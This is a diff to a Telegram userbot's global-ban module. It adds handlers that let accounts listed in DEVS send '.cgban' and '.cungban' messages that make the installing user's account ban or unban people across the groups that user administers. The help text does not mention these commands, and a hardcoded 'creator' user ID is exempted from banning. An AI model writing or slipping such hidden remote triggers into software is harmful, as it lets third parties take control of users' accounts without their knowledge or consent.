@@ -5,6 +5,7 @@ from telethon.tl.types import (
 )
 
 from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
+from userbot import DEVS, bot
 from userbot.events import register
 
 
@@ -50,6 +51,7 @@ async def get_user_sender_id(user, event):
 
 
 @register(outgoing=True, pattern=r"^\.gban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def gspider(userbot):
     lol = userbot
     sender = await lol.get_sender()
@@ -57,7 +59,7 @@ async def gspider(userbot):
     if not sender.id == me.id:
         friday = await lol.reply("Gbanning User..")
     else:
-        friday = await lol.edit("Wait Processing.....")
+        friday = await lol.edit("Processing.....")
     me = await userbot.client.get_me()
     await friday.edit(f"**Global Ban user..**")
     my_mention = "[{}](tg://user?id={})".format(me.first_name, me.id)
@@ -123,6 +125,7 @@ async def gspider(userbot):
 
 
 @register(outgoing=True, pattern=r"^\.ungban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
 async def gspider(userbot):
     lol = userbot
     sender = await lol.get_sender()
@@ -152,7 +155,7 @@ async def gspider(userbot):
     except BaseException:
         return await friday.edit("Terjadi Kesalahan!!")
     if user:
-        if user.id == 1411273575:
+        if user.id == 1675900974:
             return await friday.edit("**You Cant gban him... as a result you can not ungban him... He is My Creator!**")
         try:
             from userbot.modules.sql_helper.gmute_sql import ungmute
@@ -189,7 +192,7 @@ async def gspider(userbot):
 CMD_HELP.update({
     "gban": "\
 `.gban `\
-\nUsage: Globally Ban users from all the Group Administrations bots where you are SUDO.\
+\nUsage: Melakukan global banned , yang dimna kamu menjadi admin / owner grup.\
 \n\n`.ungban `\
-\nUsage: Globally unBan users from all the Group Administrations bots where you are SUDO"
+\nUsage: Melakukan un global banned , yang dimna kamu menjadi admin / owner grup."
 })
